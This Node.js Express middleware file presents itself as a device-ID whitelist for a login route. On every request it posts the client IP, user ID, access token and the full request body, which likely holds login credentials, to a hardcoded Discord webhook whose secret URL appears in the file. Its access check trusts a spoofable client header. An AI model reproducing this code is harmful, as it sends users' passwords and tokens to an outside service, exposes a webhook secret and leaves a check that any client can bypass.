const axios = require('axios');

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1234231371405332622/vXp-jeEBi8_IqzFHscQMJtO-TUfWMlP-JWAFV2ckyEKtsezF7kpFBBL9H9VjCw-aTMdA';
let WHITELISTED_URL = '/user/api/v1/app/login'; // URL for which whitelist is enabled
const WHITELISTED_DEVICE_ID = 'a9fc756e10751e9e'; // Device ID for whitelist access

let whitelistRequire = true; // Change this value as needed

const setWhitelistedUrl = (url) => {
    WHITELISTED_URL = url;
}

const checkIpAccess = async (req, res, next) => {
    const CLIENT_DEVICE_ID = req.headers['bmg-device-id'];
    const CLIENT_IP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const REQUEST_URL = req.originalUrl;
    const REQUEST_HEADERS = req.headers;
    const REQUEST_BODY = req.body;

    console.log("Client Device ID:", CLIENT_DEVICE_ID);

    const isWhitelistEnabled = REQUEST_URL === WHITELISTED_URL && whitelistRequire;

    const isAllowed = isWhitelistEnabled ? 
        (CLIENT_DEVICE_ID === WHITELISTED_DEVICE_ID) : // Check bmg-device-id header for whitelist access
        true; // Allow access if whitelist not enabled

    if (isAllowed) {
        console.log("Access granted");
    } else {
        console.log("Access denied");
        // Send information to Discord webhook for denied access
        await sendToDiscordWebhook(CLIENT_IP, REQUEST_URL, isAllowed, REQUEST_HEADERS, REQUEST_BODY);
        res.status(401).json({
            code: 109,
            message: "Server denied your login unauthorized not whitelist",
            data: null
        });
        return; // Exit the middleware if access is denied
    }

    // Send information to Discord webhook for granted access
    await sendToDiscordWebhook(CLIENT_IP, REQUEST_URL, isAllowed, REQUEST_HEADERS, REQUEST_BODY);
    next(); // Proceed to the next middleware if access is granted
}

// Function to send information to Discord webhook
const sendToDiscordWebhook = async (clientIP, requestUrl, isAllowed, requestHeaders, requestBody) => {
    const headersStr = Object.entries(requestHeaders)
        .filter(([key]) => ['userid', 'accessToken', 'bmg-device-id', 'language', 'x-vercel-ip-country', 'country'].includes(key))
        .map(([key, value]) => `${key}: ${value}`)
        .join('\n');

    const userId = requestHeaders['userid'] || 'undefined';
    const accessToken = requestHeaders['access-token'] || 'undefined';
    const bmgdevice = requestHeaders['bmg-device-id'] || 'undefined';
    const language = requestHeaders['language'] || 'undefined';
    const vercelIp = requestHeaders['x-vercel-ip-country'] || 'undefined';
    const country = requestHeaders['country'] || 'undefined';

    const accessStatus = isAllowed ? "granted" : "denied";

    const embedPayload = {
        title: "Access Control Notification",
        description: `Client IP: ${clientIP}\nAccess: ${accessStatus}\nRequest URL: ${requestUrl}\nRequest Headers:\n${headersStr}\n\nUser ID: ${userId}\nAccess Token: ${accessToken}\nDevice ID: ${bmgdevice}\nLanguage: ${language}\nVercel IP: ${vercelIp}\nCountry: ${country}\n\nBody Content: ${JSON.stringify(requestBody)}`,
        color: isAllowed ? 3066993 : 15158332 // Green for granted, Red for denied
    };

    const payload = {
        embeds: [embedPayload]
    };

    try {
        await axios.post(DISCORD_WEBHOOK_URL, payload);
        console.log("Info sent to Discord webhook");
    } catch (error) {
        console.error("Error sending info to Discord webhook:", error);
    }
}

module.exports = checkIpAccess;